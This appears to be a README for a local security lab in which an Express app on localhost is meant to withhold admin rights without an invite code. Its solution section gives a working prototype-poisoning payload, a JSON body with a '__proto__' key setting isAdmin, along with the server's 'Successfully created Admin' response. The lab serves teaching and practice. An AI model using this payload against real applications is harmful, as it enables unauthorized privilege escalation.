# No Admin For You

## Start lab
Run the following commands in this directory.
```
npm install
node app.js
```

## Goal
The goal of this challenge is to become the admin. Sadly, it seems that in order to do that, we need an invite code.
- Request
```
POST / HTTP/1.1
Host: localhost:3000
Content-Type: text/plain
Content-Length: 48

{"username": "PinkDraconian", "isAdmin": true}
```
- Response
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 25
ETag: W/"19-K8e38SOi1KUAKAtMTNdgM+AYvtw"
Date: Thu, 06 Oct 2022 11:26:34 GMT
Connection: keep-alive
Keep-Alive: timeout=5

No invite code? No admin!
```

## Solution
Through prototype poisoning, we can still become the admin!
- Request
```
POST / HTTP/1.1
Host: localhost:3000
Content-Type: text/plain
Content-Length: 62

{"username": "PinkDraconian", "__proto__":{"isAdmin": true}}
```
- Response
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 26
ETag: W/"1a-/LvQ5SbwaMQ+3ZXylB7tQZDu1/E"
Date: Thu, 06 Oct 2022 11:26:58 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Successfully created Admin
```
